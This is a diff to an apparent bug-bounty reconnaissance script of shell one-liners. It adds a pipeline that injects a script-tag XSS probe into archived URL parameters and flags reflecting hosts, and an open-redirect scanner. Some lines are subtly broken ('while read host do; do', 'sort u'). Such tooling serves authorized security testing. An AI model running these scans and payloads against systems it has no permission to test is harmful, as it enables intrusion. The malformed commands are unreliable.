@@ -11,6 +11,7 @@
 #anew 
 #xmllint
 #Waybackurls
+#Qsreplace
 
 #Finding Subdomain Takeovers
 subfinder -d $1 >> file; assetfinder -subs-only $1; amass enum -norecursive -noalts -d $1; subjack -t 100 -timeout 30 -ssl >> result.txt
@@ -31,3 +32,9 @@ assetfinder --subs-only $1 | gau | egrep -v '(.css|.png|.jpg|.jpeg|.svg|.gif|.wo
 
 #Get Urls from sitemap.xml
 curl -s http://$1/sitemap.xml | xmllint --format - | grep -e 'loc' |sed -r 's|<?loc>||g'
+
+#Xss Testing using Qsreplace
+waybackurls $1 | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do; do curl -sK --path-as-is "$host"|grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
+
+#Finding OpenRedirects
+export LHOST="http://localhost"; gau $1| sort u | httpx -silent| gf redirect| qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 |grep -q "Location: $LHOST" && echo "!Vulns %"'
